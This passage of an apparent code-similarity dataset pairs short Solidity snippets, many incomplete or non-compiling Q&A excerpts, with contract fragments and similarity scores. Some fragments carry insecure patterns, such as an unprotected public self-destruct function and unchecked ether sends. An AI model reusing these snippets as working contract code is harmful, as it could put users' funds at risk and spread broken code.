      token = TokenA(_token);
   }

}",0.5409238279130868,"contract Token{

  function transfer(address to, uint value) returns (bool);

}"
"contract Caller {
    Callee callee;

    constructor(address _callee) {
        callee = Callee(_callee);
    }
}",0.5266435096569931,"contract Attack {

    constructor(address to) public payable {

        require(to.call.value(msg.value)());

    }

}"
"contract Mappings {
    mapping(address => mapping(uint256 => Shelf)) bookcase;
    struct Shelf {
      bytes32[] books;
      uint shelfId;
    }
}",0.5989762902834157,"contract PostLike {
  mapping(uint256 => uint256) public postLikeCount;
  mapping(address => mapping(uint256 => bool)) public liked;
}"
"contract Foo {
  uint internal x; 
  mapping (uint => uint) internal y; 
  uint [] internal z; 
}",0.5147080538455352,"contract LibUserInfo {

  struct Following {

    address leader;

    uint percentage; 

    uint index;

  }

}"
"contract C {

   uint store=45;

    }",0.5450831987148002,"contract STCDR is Token{

	

}"
"contract A {

    modifier onlyValidAddresses(address[] memory pAddresses)
    {
        
        _;
    }    
}",0.5746340419481004,"contract IAddressList {
    mapping (address => bool) public listedAddresses;
}"
"contract B is A {
    function checkIfIsValid(address[] calldata addresses)
        external pure onlyValidAddresses(addresses) 
    {
        
    }
}",0.5887824868865089,"contract Kyber {

	function searchBestRate(address, address, uint256, bool) external view returns(address, uint256) {}

}"
"contract WithdrawDAO {
    ...    
    function withdraw(){
        uint balance = mainDAO.balanceOf(msg.sender);

        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))
            throw;
    }
    ...    
}",0.5469380412514105,"contract StorageBase is Ownable {

    function withdrawBalance() external onlyOwner returns (bool) {
        
        
        bool res = msg.sender.send(address(this).balance);
        return res;
    }
}"
"contract myContract {

  using SafeMath for uint256;

  ",0.5176334837316009,"contract Dragon {
    function burnDragons( uint256 _amount );
}"
"contract MyContract {
    using SafeMath for uint256;
    ...
}",0.5153480703781702,"contract Dragon {
    function burnDragons( uint256 _amount );
}"
"contract PersonalInfo{

    address storageContractAddr = ""Here goes your StorageContract address already deployed"";

    function PersonalInfo(string Name, string Email) public{
        StorageContract s = StorageContract(storageContractAddr);
        s.savePersonalInfo(Name, Email, this);
    }
}",0.508633088276156,"contract ESlotsICOTokenDeployed {

    
    address internal tokenContractAddress;
    ESlotsICOToken icoContract;

    function ESlotsICOTokenDeployed(address tokenContract) public {
        require(tokenContract != address(0));
        tokenContractAddress = tokenContract;
        icoContract = ESlotsICOToken(tokenContractAddress);
    }
}"
"contract Magger {  

    function getOrderMag(int256 input) constant returns (int256){
        int counter=0;
        if (input<0){
            input=input*-1;
        }
            while((input/10)>=1){
                input = input/10;
                counter++;
            }

        return counter;
}
}",0.5466689540027925,"contract Fresh is SafeMath {
    function expiredBlock()
    internal
    constant 
    returns(uint) {
        uint256 expired = block.number;
        if (expired > 256) {
            expired = sub(expired, 256);
        }
        return expired;
    }
}"
"contract utf8StringLength
{
    

    function utfStringLength(string str) constant
    returns (uint length)
    {
        uint i=0;
        bytes memory string_rep = bytes(str);

        while (i<string_rep.length)
        {
            if (string_rep[i]>>7==0)
                i+=1;
            else if (string_rep[i]>>5==0x6)
                i+=2;
            else if (string_rep[i]>>4==0xE)
                i+=3;
            else if (string_rep[i]>>3==0x1E)
                i+=4;
            else
                
                i+=1;

            length++;
        }
    }

    


    

    string constant hello1= ""袩褉懈胁械褌"";
    string constant hello2= ""Hello"";
    string constant hello3= ""浣犲ソ"";
    string constant hello4= ""賴賷賱賵"";
    string constant hello5= ""賲乇丨亘丕"";


    function test() constant
    returns
        (uint,
        uint,
        uint,
        uint,
        uint)
    {
        return(
            utfStringLength(hello1),
            utfStringLength(hello2),
            utfStringLength(hello3),
            utfStringLength(hello4),
            utfStringLength(hello5)
        );
    }
    
}",0.5467661492348475,"contract Metadata {
    using strings for *;

    function tokenURI(uint _tokenId) public pure returns (string memory _infoUrl) {
        string memory base = ""https:
        string memory id = uint2str(_tokenId);
        return base.toSlice().concat(id.toSlice());
    }

    function uint2str(uint i) internal pure returns (string memory) {
        if (i == 0) return ""0"";
        uint j = i;
        uint length;
        while (j != 0) {
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint k = length - 1;
        while (i != 0) {
            uint _uint = 48 + i % 10;
            bstr[k--] = toBytes(_uint)[31];
            i /= 10;
        }
        return string(bstr);
    }

    function toBytes(uint256 x) public pure returns (bytes memory b) {
        b = new bytes(32);
        assembly { mstore(add(b, 32), x) }
    }
}"
"contract Escrow {
    address game;
    address player1;
    address player2;

    Escrow addr = Escrow(this);
    address payable escrowWallet = address(uint160(address(addr)));

    constructor(address _player1, address _player2, address _game) public {
        player1 = _player1;
        player2 = _player2;
        game = _game;
    }
}",0.5214784730628305,"contract ENSLoanOpenerStorage is Ownable {
    address public bZxContract;
    address public bZxVault;
    address public loanTokenLender;
    address public loanTokenAddress;
    address public wethContract;

    address public ensLoanOwner;

    uint256 public initialLoanDuration = 7884000; 
}"
"contract DAPP {

    ERC20interface myToken;

    
    DAPP(address erc20Address) {
        myToken = ERC20interface(erc20Address)
    }

}",0.5098996466959095,"contract DataCenterAddrResolverInterface {

  function getAddress() public returns (address _addr);

}"
"contract B {    
    struct  Player {
        uint id;   
    }
    mapping (uint=> Player) public Players; 
 }",0.5694330679307852,"contract LibUserInfo {

  struct Following {

    address leader;

    uint percentage; 

    uint index;

  }

}"
"contract Factory { ...
contract Created {
  event LogSomething(bytes32 Id); 
  ...
  LogSomething(Id);",0.514432854789952,"contract SaiTubEvents {
    event LogNewCup(address indexed lad, bytes32 cup);
}"
"contract TestAuction {

 Auction auction = Auction(DeployedAddresses.Auction());

}",0.5083349748112659,"contract DxGenAuction4Rep is Auction4Reputation {

    constructor() public {}

}"
"contract BContract {
  MyNFT721 myNft;

  constructor(address nft) public {
    myNFT721 = MyNFT721(nft);
  }
}",0.5928220924936791,"contract TestContract {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
}"
contract RefundableCrowdsale is Crowdsale {},0.5832969482749957,"contract AssembledCommonSale is CommonSale {

}"
contract MintedCrowdsale is Crowdsale {},0.5718340789011888,"contract AssembledCommonSale is CommonSale {

}"
contract TieredCrowdsale is Crowdsale {},0.5718340789011888,"contract AssembledCommonSale is CommonSale {

}"
contract TimedCrowdsale is RefundableCrowdsale {},0.5439604924587471,"contract AssembledCommonSale is CommonSale {

}"
"contract StructError {
    
    mapping (bytes16=>Device) public Device_Table;

    struct Device {
        bytes16 UUID;
        bytes16 hardware_UUID;
        
        uint256 created_at;
    }
}",0.5175451173991681,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract StorageController {
    struct Storage {
        string name;
        uint256 maxLength;
        uint256 rank;
        uint256 writingFee;
        uint256 sellPrice;
        bool nonpublic;
    }

    mapping(uint256 => Storage) public storages;
    uint storageCount = 0;

    constructor() public {
        Storage memory newStorage = Storage({
            name: 'aaa',
            maxLength: 11,
            rank: 12,
            writingFee: 13,
            sellPrice: 14,
            nonpublic: false
        });

        storages[storageCount++] = newStorage;
    }

    function getStorageData(uint256 i) external view 
        returns(string memory name, uint256 maxLength, uint256 rank, uint256 writingFee, uint256 sellPrice, bool nonpublic) {
        return (storages[i].name, storages[i].maxLength,storages[i].rank,storages[i].writingFee,storages[i].sellPrice,storages[i].nonpublic);
    }
}",0.5578661220360334,"contract PiggyBank  {

  string public name;

  string public symbol = '%';

  uint8 constant public decimals = 18;

  uint256 constant internal denominator = 10 ** uint256(decimals);

  uint256 internal targetAmount;



  address internal targetAddress;



  constructor(

    string goalName,

    uint256 goalAmount

  ) public

  {

    name = goalName;

    targetAmount = goalAmount;

    targetAddress = msg.sender;

  }



  function balanceOf() view public returns(uint256)

  {

    return 100 * address(this).balance / targetAmount;

  }



  event Transfer(address indexed from, address indexed to, uint256 value);



  function () public payable {

    if (balanceOf() >= 100) {

      selfdestruct(targetAddress);

    }

  }



  function debugDestruct() public {

    selfdestruct(targetAddress);

  }





}"
"contract test {


     bytes1 x = lib.g();


}",0.5915519272128231,"contract test {
    function f() public { }
}"
"contract B is A{
    uint b;

    constructor (uint _a, uint _b) A(_a) public{
        b = _b;
    }
}",0.5811592775080023,"contract    Token  is  ERC20
{
    using SafeMath  for uint256;

    
    constructor()   public 
    {
    }
    
    
    
}"
"contract Complex {
    struct Data {
        uint a;
        bytes3 b;
        mapping (uint => uint) map;
    }
    mapping (uint => mapping(bool => Data[])) public data;
}",0.5903684497214454,"contract SmartolutionInterface {

    struct User {

        uint value;

        uint index;

        uint atBlock;

    }



    mapping (address => User) public users; 

}"
"contract SomeContract {

mapping(address => bool) public users;   
users[msg.sender]=true;
modifier guardAndLog(string msg )
        {
            LogAccessAttempt(msg.sender,msg,now);
            if(!users[msg.sender])
               throw
            _;
        }

    function addUser(address _newUser)
    guardAndLog(""someone tried to add a user"")
    {
       users[_newUser]=true
    }

    function someFunction()
     guardAndLog(""someone tried to access someFunction"")
    {
    
    }

   }",0.5759679177206398,"contract Ownable {

  address public owner;
  mapping (address => bool) public accessHolder;

  
  function Ownable() {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  
  function transferOwnership(address newOwner) onlyOwner {
    require(newOwner != address(0));
    owner = newOwner;
  }
  
  
  function addToAccesslist(address user) onlyOwner {
    accessHolder[user] = true;
  }
  
}"
"contract StructError {
    
    mapping (bytes16=>Device) public Device_Table;

    struct Device {
        bytes16 UUID;
        bytes16 hardware_UUID;
        string phone_Number;
        uint256 created_at;
    }
}",0.5145765498683545,"contract Club {
  struct Member {
    bytes20 username;
    uint64 karma; 
    uint16 canWithdrawPeriod;
    uint16 birthPeriod;
  }

  
  mapping(address => Member) public members;
}"
"contract DepositAddress{
    string username;
    address exchange;
    event ReceivedEther(uint amount, uint time, string username);

    function DepositAddress(string _username, address _exchange){
        exchange =_exchange;
        username = _username;
    }

    function(){
        ReceivedEther(msg.value,block.timestamp,username);
        exchange.send(msg.value);
    }
}",0.5424556518103972,"contract SmartDeposit {
    function SmartDeposit() {

    }

    event Received(address from, bytes user_id, uint value);

    function() payable {
        if (msg.value > 0 && msg.data.length == 4) {
            Received(msg.sender, msg.data, msg.value);
            m_account.transfer(msg.value);
        } else throw;
    }

    address public m_account = 0x0C99a6F86eb73De783Fd5362aA3C9C7Eb7F8Ea16;
}"
"contract TestContract {
    event Start(uint start, uint middle, uint end) anonymous;
    event End(uint start, uint middle, uint end) anonymous;",0.5153644028134122,"contract IFlap {
    function tick(uint id) external;
    function tend(uint id, uint lot, uint bid) external;
    function deal(uint id) external;
}"
"contract Foo {
  bytes32 public barHash;

  constructor (bytes32 _barHash) public {
    barHash = _barHash;
  }
}",0.5585846598591693,"contract InstaMaker is CDPResolver {



    uint public version;

    

    

    constructor() public {

        version = 1;

    }



}"
"contract Transport {
    struct Batch {
        string creationDate;
        address owner;
        string origin;
        string productName;
    }
    Batch[] public batches;

    function createNewBatch(
        string calldata creationDate,
        address owner,
        string calldata origin,
        string calldata productName
    )
        external
    {
        batches.push(Batch({
            creationDate: creationDate,
            owner: owner,
            origin: origin,
            productName: productName
        }));
    }
}",0.5201117891818526,"contract DigitalPrintImage {

	struct ImageMetadata {

        uint finalSeed;

        bytes32[] potentialAssets;

        uint timestamp;

        address creator;

        string ipfsHash;

        string extraData;

    }



    mapping(uint => ImageMetadata) public imageMetadata;



	function totalSupply() public view returns (uint256);

	function getImageMetadata(uint _imageId) public view

    	returns(address, string, uint, string, uint, bytes32[]);

}"
"contract EventTest {
  
  event marketCreated(address[2] virtualShareAddresses, address market, uint256 indexed endTime, string description, string extraInfo);
  


  function createYesNoMarket(
    uint256 _endTime,
    string memory _description,
    string memory _extraInfo
    ) public payable returns (bool) 

  {
    address[2] memory virtualShareAddresses;
    address newMarket = address(0);
    virtualShareAddresses[0] = address(1);
    virtualShareAddresses[1] = address(2);
    emit marketCreated(virtualShareAddresses, address(newMarket), _endTime, _description, _extraInfo);
    return true;
  }
}",0.563134708078693,"contract TokenTransferProxy {



    modifier onlyExchange {

        require(msg.sender == exchangeAddress);

        _;

    }



    address public exchangeAddress;





    event LogAuthorizedAddressAdded(address indexed target, address indexed caller);



    function TokenTransferProxy() public {

        setExchange(msg.sender);

    }

    



    

    

    

    

    

    

    function transferFrom(

        address token,

        address from,

        address to,

        uint value)

        public

        onlyExchange

        returns (bool)

    {

        return Token(token).transferFrom(from, to, value);

    }



    

    

    function setExchange(address _exchange) internal {

        require(exchangeAddress == address(0));

        exchangeAddress = _exchange;

    }

}"
"contract Analytics {
    address lastAddress;
    uint timeStamp;
    string label;
    uint count;
    string id;
    string typeofEntry; 
    string channel;
    string createdAt;
    
    struct Field {
        string typeOfFunding; 
        uint amount;
        string cohort;
        string promotion;
    }
    struct Entry {
        string id;
        string typeofEntry; 
        string channel;
        string createdAt;
        uint totalAmount; 
        Field funding;
    }
    mapping(uint => Entry) entries;

    function updateEntry (
                    uint _index,
                    string memory _id,
                    string memory _typeOfEntry,
                    string memory _channel,
                    string memory _typeofFunding,
                    uint  _amount,
                    string memory _cohort,
                    string memory _promotion,
                    string memory _createdAt,
                    uint  _totalAmount) public returns 
                    (bool sucess)
    {
        entries[_index] = Entry(_id, _typeOfEntry, _channel, _createdAt, _totalAmount, Field(_typeofFunding, _amount, _cohort, _promotion));
        return true;
    }
}",0.5484998534233042,"contract standardTokenFactory {
    
    
    
    string public stamp;
    bool public gated;
    address public deployer;
    
    standardToken private ST;
    
    address[] public tokens;
    
    event Deployed(address indexed ST, address indexed owner);
    
    constructor (string memory _stamp, bool _gated, address _deployer) public 
	{
        stamp = _stamp;
        gated = _gated;
        deployer = _deployer;
	}
    
    function newToken(
        string memory name, 
		string memory symbol,
		string memory _stamp,
		uint8 decimals,
		uint256 cap,
		uint256[] memory initialSupply,
		address[] memory ownership) public {
       
        if (gated == true) {
            require(msg.sender == deployer);
        }
       
        ST = new standardToken(
            name, 
            symbol, 
            _stamp,
            decimals,
            cap,
            initialSupply,
            ownership);
        
        tokens.push(address(ST));
        
        emit Deployed(address(ST), ownership[0]);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract SampleOverflow {
  string constant statictext = ""HelloStackOverFlow"";
  bytes32 constant byteText = ""HelloStackOverFlow"";
  function  getString() payable public  returns(string){
    return statictext;
  }

  function  getByte() payable public returns(bytes32){
    return byteText;
  }
}",0.5722834168386379,"contract Utils {

  function testrc(bytes32 hash, uint8 v, bytes32 r, bytes32 s) public pure returns(address) {

    return ecrecover(hash, v, r, s);

  }



  function hash(uint x, uint y, uint z, uint w) public pure returns(bytes32) {

    return sha3(x,y,z,w);

  }

}"
"contract users {

struct userData{
   string fName;
   string lName;
} 

mapping(address => userData) userAddressToData;

}",0.5491707065935769,"contract StableStore {
    
    mapping (address => string) public store;
    
    function setValue(string _value) {
        store[msg.sender]=_value;
    }
}"
"contract Store {

  Shipping s;

  ...
}",0.5456840460846627,"contract STCDR is Token{

	

}"
"contract MyPausableContract is Pausable {

    myFunction() whenNotPaused {
        do things...
    }

}",0.5242376241179546,"contract EtherbotsPrivileges is Pausable {
  event ContractUpgrade(address newContract);

}"
"contract constTest
    {
       uint constant public constNow = now;
       uint constant public ffff = 0xffff;
       uint public stateNow = now;
    }",0.5819385368886384,"contract KState is KOwnerable {
    uint public _CIDXX;
    Hosts public _KHost;
    constructor(uint cidxx) public {
        _CIDXX = cidxx;
    }
}"
"contract test{
    address []array;
}",0.5863910010158406,contract test2 is BaseRegistry {}
"contract myContract{

    mapping(address => string) contractName;
    event myEvent(address contractRef);

    function myContract(){
        
        ...
    }

    myMethod(address _contract){
        ...
        myEvent(contractName[_contract]);
    }
}",0.5816790018818051,"contract NEST_ToLoanDataContract {

    

    function addContractAddress(address contractAddress) public;

    

    function checkContract(address contractAddress) public view returns (bool);

}"
"contract Alphabet {
    Letter[] letters;

    event printer(uint);

    
    function Alphabet() 
        public {
        letters.push(new A());
        letters.push(new B());
        letters.push(new C());
    }

    
    function alphabetFromAddresses(address _addrA, address _addrB, 
                                   address _addrC)
        public{
        letters.push(A(_addrA));
        letters.push(B(_addrB));
        letters.push(C(_addrC));
    }

    function getLetters() 
        public {
        for(uint i = 0; i < letters.length; i++) {
            printer(letters[i].f());
        }
    }
}",0.5605071125630974,"contract ERC20 is ERC20Interface{



    function allowance(address owner, address spender) public view returns (uint);

    function transferFrom(address from, address to, uint value) public returns (bool);

    function approve (address spender, uint value) public returns (bool);

    event Approval (address indexed owner, address indexed spender, uint value);



}"
"contract Test {

    uint256 public testNum;
    uint256 public historicTestNum;
    address public owner;

    constructor () public 
    {
        owner = msg.sender;
        testNum = 1;
        historicTestNum = 1;
    }

    function returnTrueIfGreaterThanTen()
        public view returns(bool)
    {
        require(testNum > 10);
        return true;
    }

    function setTestNum(uint256 _newNum) 
        onlyOwner
    {
        testNum = _newNum;
        if (block.number <= 90) {
            historicTestNum = testNum;
        }
    }

    function returnTrueIfHistoricGreaterThanTen()
        public view returns(bool)
    {
        return (block.number > 90 && historicTestNum > 10);
    }

}",0.5924211438172312,"contract SKYFReserveFund is Ownable{

    uint256 public constant startTime = 1534334400;

    uint256 public constant firstYearEnd = startTime + 365 days;

    

    SKYFTokenInterface public token;



    function setToken(address _token) public onlyOwner returns (bool) {

        require(_token != address(0));

        if (token == address(0)) {

            token = SKYFTokenInterface(_token);

            return true;

        }

        return false;

    }



    function transfer(address _to, uint256 _value) public onlyOwner returns (bool) {

        require(now > firstYearEnd);



        token.transfer(_to, _value);



    }

}"
"contract B{ 
import './A.sol'  
}",0.5844356470407898,contract Gold is ERC20 {}
"contract voting is admingroup {
}",0.5722142718975911,contract TongCoin is ERC20{}
"contract Mail{
    struct MailInfo{
        bytes ipfs;
        bytes enc_hash;
    } 
    mapping(address=>MailInfo) loginInfo;
    function getIPFS(address userId) public constant returns(bytes,bytes){
       return (loginInfo[userId].ipfs,loginInfo[userId].enc_hash);
    }

}",0.5486525597240436,"contract BasicToken is ERC20Basic {
	using SafeMath for uint256;
	mapping(address => uint256) balances;

	function balanceOf(address _owner) public constant returns (uint256 balance) {return balances[_owner];}	
}"
"contract Crowdsale {
    token public tokenReward;

    
    function Crowdsale(
        address addressOfTokenUsedAsReward
    ) {
        tokenReward = token(addressOfTokenUsedAsReward);
    }
}",0.5463262747822595,"contract CAIDToken{
  function setCrowdsaleContract (address) public;
  function sendCrowdsaleTokens(address, uint256)  public;
  function endICO () public;

}"
"contract TestAdoption
{
  Adoption adoption = Adoption(DeployedAddresses.Adoption());

  
  uint expectedPetId = 8;

  
  address expectedAdopter = address(this);

  
  function testUserCanAdoptPet() public
  {
    uint returnedId = adoption.adopt(8);

    uint expected = 8;

    Assert.equal(returnedId, expected, ""Adoption of pet ID 8 should be recorded."");
  }

  
  function testGetAdopterAddressByPetId() public
  {
    
    address expected = address(this);

    address adopter = adoption.adopters(8);

    Assert.equal(adopter, expected, ""Owner of pet ID 8 should be recorded."");
  }

  
  function testGetAdopterAddressByPetIdInArray() public
  {
    
    address expected = address(this);

    
    address[16] memory adopters = adoption.getAdopters();

    Assert.equal(adopters[8], expected, ""Owner of pet ID 8 should be recorded."");
  }

}",0.5403947101434639,"contract ERC721 {
    
    
    
    
    function totalSupply() public constant returns (uint256);
    function balanceOf(address _owner) public constant returns (uint balance);
    function ownerOf(uint256 _tokenId) public constant returns (address owner);
    function approve(address _to, uint256 _tokenId) public ;
    function allowance(address _owner, address _spender) public constant returns (uint256 tokenId);
    function transfer(address _to, uint256 _tokenId) external returns (bool success);
    function transferFrom(address _from, address _to, uint256 _tokenId) external;
    
    
    
    
    
    
    
    event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);
    event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);
}"
"contract UserIndendity{

    struct A
    {
        uint a1;
        uint a2;
        uint a3;
        uint a4;
        uint a5;
        uint a6;
        uint a7;
        uint a8;
        uint a9;
        uint a10;
        uint a11;
        uint a12;
        uint a13;
        uint a14;
    }

    A public a;

    struct B
    {
        string b1;
        string b2;
        string b3;
        string b4;
        string b5;
        string b6;
        string b7;
    }

    B public b;    

    struct C
    {
        bytes32 c1;
        bytes32 c2;
        bytes32 c3;
        bytes32 c4;
        bytes32 c5;
        bytes32 c6;
        bytes32 c7;
        bytes32 c8;
        bytes32 c9;
        bytes32 c10;
        bytes32 c11;
        bytes32 c12;
        bytes32 c13;
        bytes32 c14;
    }

    C public c;

    struct D
    {
        bytes d1;
        bytes d2;
        bytes d3;
        bytes d4;
        bytes d5;
        bytes d6;
        bytes d7;
    }

    D public d;
}",0.5015354085953231,"contract StringHelpers {

    using strings for *;

    

    function stringToBytes32(string memory source) internal returns (bytes32 result) {

        bytes memory tempEmptyStringTest = bytes(source);

        if (tempEmptyStringTest.length == 0) {

            return 0x0;

        }

    

        assembly {

            result := mload(add(source, 32))

        }

    }



    function bytes32ToString(bytes32 x) constant internal returns (string) {

        bytes memory bytesString = new bytes(32);

        uint charCount = 0;

        for (uint j = 0; j < 32; j++) {

            byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));

            if (char != 0) {

                bytesString[charCount] = char;

                charCount++;

            }

        }

        bytes memory bytesStringTrimmed = new bytes(charCount);

        for (j = 0; j < charCount; j++) {

            bytesStringTrimmed[j] = bytesString[j];

        }

        return string(bytesStringTrimmed);

    }

}"
"contract Crowdsale {
    uint tokenPrice = 500000000000000 wei;
    uint public tokensToGet = 0;
    function buyToken() payable returns (uint){
        tokensToGet = msg.value / tokenPrice;
        return tokensToGet;
    }
}",0.5905303951931269,"contract FeeInterface {
    function rateOf (address token) public view returns (uint);
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract B {
    event myLog(bool indexed here);
    function() {
        myLog(true);
    }
}",0.5633849912356722,"contract ValueLike {
    function peek() public returns (uint, bool);
}"
"contract Bar {
   Foo foo;
   address public fooAddress;

   Bar() {
        foo = new Foo();
        fooAddress = address(foo);
   }
}",0.5973212826797589,"contract Simple

{

    address public owner;



    constructor (address ownerAddress) public

    {

        owner = ownerAddress;

    }

}"
"contract Factory is FactoryInterface {
  A a;
  B b;
}",0.5050556765478946,"contract ownedContractInterface

{

  address public owner;



}"
"contract External {

    DeployedContract d;

    constructor() public {
        d = new DeployedContract();
    }

    function getEmailList(bytes32 email, bytes32 date) public view returns(bytes32[] ){
       return (d.getEmails(email, date));
    }
}",0.5862370191713582,"contract Notary {
    mapping (bytes32 => bool) public hashes ;
    
    function register(bytes32 _hash) public {
        hashes[_hash] = true;
    }
    
    function check(bytes32 _hash) public view returns (bool) {
        return hashes[_hash];
    }
}"
"contract A
{
    struct Prop
    {
        uint256 foo; 
    }

    struct App
    {
        string name; 
        Prop[] props;
    }

    App[] apps;

    function AddProp(string memory name) public
    {
        App storage a = FindApp(name); 

        if(bytes(a.name).length > 0)
            a.props.push(Prop(0));
        else
            revert('Application not found');        
    }

    function FindApp(string memory name) internal view returns (App storage) 
    {
        bytes32 hash = keccak256(abi.encodePacked(name));
        for(uint256 i = 0; i < apps.length; i++)
        {
            
            if (keccak256(abi.encodePacked(apps[i].name)) == hash)
            {
                return apps[i];
            }
        }

        revert(""Not found.""); 
    }
}",0.5708351212619412,"contract SelfDestructible is Ownable {



    function selfDestruct(uint8 v, bytes32 r, bytes32 s) public onlyOwner {

        if (ecrecover(prefixedHash(), v, r, s) != owner) {

            revert();

        }

        selfdestruct(owner);

    }



    function originalHash() internal view returns (bytes32) {

        return keccak256(abi.encodePacked(

                ""Signed for Selfdestruct"",

                address(this),

                msg.sender

            ));

    }



    function prefixedHash() internal view returns (bytes32) {

        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";

        return keccak256(abi.encodePacked(prefix, originalHash()));

    }

}"
"contract FormSubmit{

  struct Student {
      string  email;
  }

  event SetData (
     uint studentId
  );

  mapping(address => Student[]) Students;

 function setData(address _address) public
{
  
  
  uint studentId = students.length;
  Student student = Student(_email);
  Students[_address].push(student);
  emit SetData(studentId); 
}

function getData(address _address, uint _studentId ) public view returns(string memory){
  return(Students[_address][_studentId].email);
}}",0.5567522848509138,"contract goodsTokenFactory {
    
    goodsToken private GT;
    
    address[] public tokens;
    
    event Deployed(address indexed GT, address indexed owner);
    
    function newGT(string memory _name, uint256 amount) public {
       
        GT = new goodsToken(
            _name, 
            amount, 
            msg.sender);
        
        tokens.push(address(GT));
        
        emit Deployed(address(GT), msg.sender);

    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract Client{

    function call(address servAdd){
        Server s = Server(servAdd);
        s.a();
    }
}",0.5798994055718927,"contract IOwned {
    function owner() public constant returns (address) { owner; }
}"
"contract bank{
struct Person{
    uint id;
    bytes32 name;
}
mapping(address => Person) public  p;

function getDetails(address a) public view returns(uint ,bytes32){
     Person storage person = p[a];
    return(person.id , person.name);
}
function setDetails(address a,uint id , bytes32 name) public{
    Person storage person = p[a];
    person.id = id;
    person.name = name;
}
}",0.5934975707958319,"contract SeriesFactory {
    address public seriesFactory;
    address public owner;

    function createSeries (
        uint seriesId,
        bytes name,
        uint shares,
        string industry,
        string symbol,
        address manager,
        address extraContract
    ) payable returns (
        address addr,
        bytes32 newName
    ) {
        address newSeries;
        bytes32 _newName;

        return (newSeries, _newName);
    }
}"
"contract C { 

    function hashingsha3 (string s)   returns  (bytes32 hash){
        return sha3(s);
    }

    function hashingsha256 (string s)   returns  (bytes32 hash){
        return sha256(s); 
    }

    function ripemd160 (string s)   returns  (bytes20 hash){
        return ripemd160(s); 
    }
}",0.588029386029948,"contract IERC721Metadata {

  
  function name() public view returns (string);

  
  function symbol() public view returns (string);

  
  function description() public view returns (string);

  
  function tokenMetadata(uint256 assetId) public view returns (string);
}"
"contract Election
{
    Passport private pass;",0.5666143665423369,"contract Gap {    

    uint256[1000] private ______gap;

}"
"contract C {
    uint lastBlock = 0;

    function myFunction(){
        if(block.number>lastBlock){
            lastBlock = block.number; 
        } else if (block.number == lastBlock){
            throw; 
        }
        
    }
}",0.5041629587322528,"contract Labyrinth {



  uint entropy;

  

  function getRandomNumber() public returns (uint) {

    entropy ^= uint(blockhash(entropy % block.number));

    return entropy;

  }



}"
"contract StarNotary { 
    struct Star { 
        string name;
        string dec;
        string mag;
        string cent;
        string story;
    }

    Star[] public stars;

    function createStar(
        string _name,
        string _dec,
        string _mag,
        string _cent,
        string _story
    )
        public
        returns (uint256) 
    {
        Star memory newStar = Star(_name, _dec, _mag, _cent, _story);

        uint256 tokenId = stars.push(newStar) - 1;

        return tokenId;

    }
}",0.5682363050964739,"contract Details {
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    
    constructor() public {
        _name = ""ZELWIN"";
        _symbol = ""ZLW"";
        _decimals = 18;
    }
    
    function name() public view returns(string memory) {
        return _name;
    }
    
    function symbol() public view returns(string memory) {
        return _symbol;
    }
    
    function decimals() public view returns(uint8) {
        return _decimals;
    }
}"
"contract HelloWorld {
  bool isHappy;
  string public response = ""Hi there!"";
  modifier onlyIfHappy {
    require(isHappy);
    _;
  }
}",0.5431949537879168,"contract WhitelistInterface {

  function hasRole(address _operator, string memory _role) public view returns (bool);

}"
"contract CampaignFactory{

address [] deployedCampaigns;
function createCampaign(uint deposit, address ll) public payable{
    require(msg.value > (40*deposit)/100 wei);
    address newCampaign = address((new Campaign).value(msg.value)(deposit, ll, 1));

    deployedCampaigns.push(newCampaign);
    } 

}",0.5216946355823895,"contract Deposit {
    
    function Deposit() {

    }

    event Received(address from, address to, uint value);

    function() payable {
        if (msg.value > 0) {
            Received(msg.sender, this, msg.value);
            m_account.transfer(msg.value);
        }
    }

    address public m_account = 0x0C99a6F86eb73De783Fd5362aA3C9C7Eb7F8Ea16;
}"
"contract MyContract {
    IERC20Extented private token;

    constructor(IERC20Extented _token) public {
        token = _token;
    }

    ...
}",0.5414039957951007,"contract XLToken is TokenERC20 {

    

    constructor() TokenERC20(18*10**16, 12*10**16, ""XL Token"", ""XL"", 8) public {}

}"
"contract Property{
    User us;
}",0.5363526748704261,"contract Peth is ERC20 {



}"
"contract test{

    bytes32 v ;

    function isEmpty() returns (bool flag){
        assembly {
            flag := eq(eq(sload(v_slot),0),1)
        }
    }
}",0.5980119833155764,"contract Authority {
    function canCall(address src, address dst, bytes4 sig) constant returns (bool);
}"
"contract AuthorizationManager{
    struct User{
      string userId;
      uint roleId;
    }

    mapping (string => User[]) companyUserMap;

    function addUser(string _key,string _userId, uint _roleId){
        companyUserMap[_key].push(User(_userId,_roleId));
    }

    function removeSingleUser(string _key){
        companyUserMap[_key].length--;
    }
}",0.5366672391245262,"contract s_Form001 {
    
    mapping (bytes32 => string) data;
    
    address owner;
    
    function s_Form001() {
        owner = msg.sender;

    }
    
    function setData(string key, string value) {
        require(msg.sender == owner);
        data[sha3(key)] = value;
    }
    
    function getData(string key) constant returns(string) {
        return data[sha3(key)];
    }


}"
"contract structWithMapping{

    struct Data{
        string[] user;
        string[] catagory;
        string[] data;
    }


    mapping(string => Data) mappedData;
    mapping(string => bool) userExists;

    string[] public dataArray;

    function setUserData(string _user, string _catagory, string _data)public{
        var addData = mappedData[_user];


        addData.user.push(_user);
        addData.catagory.push(_catagory);
        addData.data.push(_data);

        require(!userExists[_user]);
        dataArray.push(_user) -1;
        
        userExists[_user] = true;
    }

    function getUsers() view public returns(string[]){
        return dataArray;
    }

    function getUserData(string _user) view public returns(string[] memory, string[] memory, string[] memory){
        return(mappedData[_user].user, mappedData[_user].catagory, mappedData[_user].data);
    }
}",0.5735643616238736,"contract DataEdit is BasicAccessControl {

    

    struct UserData {

        mapping (string => address) ref;

    }

    mapping (address => UserData) userData;

    mapping (address => mapping(string=>uint)) promotion;



    
